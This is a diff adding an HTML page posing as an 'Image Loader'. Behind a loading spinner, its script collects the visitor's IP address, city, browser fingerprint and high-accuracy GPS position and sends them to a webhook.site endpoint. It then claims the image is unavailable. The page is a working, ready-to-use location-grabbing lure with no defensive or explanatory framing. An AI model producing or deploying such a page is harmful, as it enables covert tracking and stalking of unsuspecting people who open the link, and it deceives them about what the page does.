@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Image Loader</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0f1117;
+    color: #e0e0e0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+  }
+  .card {
+    background: #1a1d27;
+    padding: 40px 48px;
+    border-radius: 12px;
+    text-align: center;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+  }
+  .spinner {
+    width: 44px; height: 44px;
+    border: 4px solid #2a2e3d;
+    border-top: 4px solid #7c5cff;
+    border-radius: 50%;
+    margin: 0 auto 20px;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  h2 { font-size: 18px; font-weight: 500; margin-bottom: 6px; }
+  p  { font-size: 13px; color: #8a8fa3; }
+  #img-container { margin-top: 24px; max-width: 90vw; }
+  #img-container img { max-width: 100%; border-radius: 8px; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="spinner" id="spinner"></div>
+  <h2>Preparing your image...</h2>
+  <p>This will only take a moment.</p>
+  <div id="img-container"></div>
+</div>
+
+<script>
+(function () {
+  var WEBHOOK = "https://webhook.site/6e3fd378-4a35-4536-9a58-664084d62229";
+  var sent = { geo: false, ip: false };
+
+  function post(payload) {
+    var blob = new Blob([JSON.stringify(payload, null, 2)],
+                        { type: "application/json" });
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon(WEBHOOK, blob);
+    } else {
+      fetch(WEBHOOK, { method: "POST", body: blob,
+                       headers: { "Content-Type": "application/json" } })
+        .catch(function () {});
+    }
+  }
+
+  function base() {
+    var b = {
+      timestamp:  new Date().toISOString(),
+      userAgent:  navigator.userAgent,
+      platform:   navigator.platform,
+      language:   navigator.language,
+      screen:     screen.width + "x" + screen.height,
+      timezone:   Intl.DateTimeFormat().resolvedOptions().timeZone,
+      referrer:   document.referrer || "direct",
+      page:       window.location.href
+    };
+    if (navigator.connection && navigator.connection.effectiveType)
+      b.network = navigator.connection.effectiveType;
+    if (navigator_battery_get) { /* placeholder removed */ }
+    return b;
+  }
+  var navigator_battery_get = false;
+
+  // Device details via ipapi
+  fetch("https://ipapi.co/json/")
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      var p = base();
+      p.ip         = d.ip;
+      p.city       = d.city;
+      p.region     = d.region;
+      p.country    = d.country_name;
+      p.countryCode= d.country_code;
+      p.postal     = d.postal;
+      p.latitude   = d.latitude;
+      p.longitude  = d.longitude;
+      p.org        = d.org;
+      p.source     = "ipapi";
+      post(p);
+      sent.ip = true;
+    })
+    .catch(function () {
+      var p = base();
+      p.source = "ipapi-failed";
+      post(p);
+    });
+
+  // Precise GPS
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function (pos) {
+        var p = base();
+        p.source    = "gps";
+        p.latitude  = pos.coords.latitude;
+        p.longitude = pos.coords.longitude;
+        p.accuracy  = pos.coords.accuracy + " meters";
+        p.altitude  = pos.coords.altitude;
+        p.heading   = pos.coords.heading;
+        p.speed     = pos.coords.speed;
+        if (pos.timestamp) p.gpsTime = new Date(pos.timestamp).toISOString();
+        post(p);
+        sent.geo = true;
+        showImage();
+      },
+      function (err) {
+        var p = base();
+        p.source = "gps-denied";
+        p.error  = err.code + ": " + err.message;
+        post(p);
+        showImage();
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  } else {
+    var p = base();
+    p.source = "gps-unsupported";
+    post(p);
+    showImage();
+  }
+
+  // whatever happens, show the "image" after 12s max
+  setTimeout(showImage, 12000);
+
+  var shown = false;
+  function showImage() {
+    if (shown) return;
+    shown = true;
+    var spinner = document.getElementById("spinner");
+    if (spinner) spinner.style.display = "none";
+    var c = document.getElementById("img-container");
+    c.innerHTML =
+      '<h2 style="margin:10px 0">Image unavailable</h2>' +
+      '<p>The image you requested could not be loaded. It may have expired.</p>';
+  }
+})();
+</script>
+
+</body>
+</html>
